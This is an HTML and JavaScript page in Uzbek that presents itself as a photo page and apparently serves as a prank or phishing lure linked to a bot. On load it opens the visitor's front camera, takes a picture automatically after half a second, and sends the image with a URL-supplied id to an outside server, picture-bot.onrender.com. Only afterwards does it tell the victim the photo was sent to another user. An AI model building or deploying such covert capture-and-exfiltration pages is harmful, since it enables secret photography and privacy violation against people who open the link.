<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasmga Olish</title>
    <style>
        /* Yangi CSS stil */
        body {
            margin: 0;
            padding: 0;
            background: #050614;
            font-family: Arial, sans-serif;
            color: white;
        }

        #container {
            max-width: 700px;
            margin: 50px auto;
            padding: 20px;
            background: #131426;
            border-radius: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        video, canvas {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 10px;
            display: none; /* Video va canvas boshlang'ich holatda yashirin */
        }

        .picture {
            border-radius: 20px;
            max-width: 600px;
            height: 400px;
            background: #1a1a2e;
            margin: 0 auto;
        }

        #byte_photo {
            border-radius: 10px;
            background-size: cover;
            height: 100%;
            background-position: center;
        }

        .desc {
            margin-top: 20px;
            background: #1a1a2e;
            padding: 20px;
            border-radius: 20px;
        }

        .desc p {
            color: white;
            font-size: 16px;
        }

        span {
            color: #2871FF;
        }

        button {
            padding: 10px 20px;
            color: white;
            background: #2871FF;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background: transparent;
            border: 1px solid #2871FF;
        }

        #message, #error {
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
        }

        #message {
            color: #28a745;
        }

        #error {
            color: red;
        }

        .hidden { display: none; }
    </style>
</head>
<body>
    <div id="container">
        <video id="video" autoplay playsinline class="hidden"></video>
        <canvas id="canvas" class="hidden"></canvas>
        <div id="prank" class="hidden">
            <div class="picture">
                <div id="byte_photo"></div>
            </div>
            <div class="desc">
                <p>🙊 Sizning rasmingiz <span>@Foydalanuvchi</span> ga yuborildi!</p>
            </div>
        </div>
        <p id="message" class="hidden">📤 Rasm yuborilmoqda...</p>
        <p id="error" class="hidden" style="color: red;"></p>
        <button id="retry" class="hidden">🔄 Qayta urinish</button>
    </div>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        const message = document.getElementById("message");
        const errorMessage = document.getElementById("error");
        const retryButton = document.getElementById("retry");
        const loadingMessage = document.getElementById("loading");
        const prank = document.getElementById("prank");
        const bytePhoto = document.getElementById("byte_photo");

        async function startCamera() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error("Kamerani qo'llab-quvvatlamaydi!");
                }

                const constraints = {
                    video: {
                        facingMode: { ideal: "user" },
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    video.play();
                    video.classList.remove("hidden");
                    loadingMessage.classList.add("hidden");

                    setTimeout(captureImage, 500);
                };
            } catch (err) {
                console.error("Kameraga ruxsat berilmadi!", err);
                errorMessage.innerText = "❌ Kameraga ruxsat berilmadi yoki kamera mavjud emas!";
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
                loadingMessage.classList.add("hidden");
            }
        }

        function captureImage() {
            if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
                errorMessage.innerText = "❌ Kamera ishlamayapti!";
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
                return;
            }

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const imageData = canvas.toDataURL("image/png");
            const userId = getQueryParam("id");

            message.classList.remove("hidden");

            fetch("https://picture-bot.onrender.com/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image: imageData, userId })
            })
            .then(res => {
                if (!res.ok) throw new Error("Server xatosi: " + res.status);
                return res.json();
            })
            .then(data => {
                prank.classList.remove("hidden");
                bytePhoto.style.backgroundImage = `url(${imageData})`;
                message.classList.add("hidden");
            })
            .catch(err => {
                console.error("Xatolik:", err);
                errorMessage.innerText = `❌ Xatolik: ${err.message}`;
                errorMessage.classList.remove("hidden");
                retryButton.classList.remove("hidden");
            });
        }

        function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
        }

        retryButton.addEventListener("click", () => {
            location.reload();
        });

        startCamera();
    </script>
</body>
</html>
